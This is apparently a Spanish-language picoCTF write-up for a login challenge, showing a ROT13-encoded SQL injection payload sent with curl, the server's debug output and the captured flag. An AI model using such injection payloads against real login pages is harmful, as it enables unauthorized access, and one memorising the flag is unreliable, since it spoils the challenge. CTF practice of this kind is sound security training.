## Objetivo

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Solución

Es necesario rotarlo a 13 ya que el password lo que hace internamente es rotarlo asi que fon la ayuda del cyberchef podemos mandarselo rotado.

Entrada ya rotada
' be 1=1;

En consola
```
czarragar-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>czarragar-picoctf@webshell:~$ 
```


```
picoCTF{3v3n_m0r3_SQL_7f5767f6}
```

## Notas adicionales

## Referencias


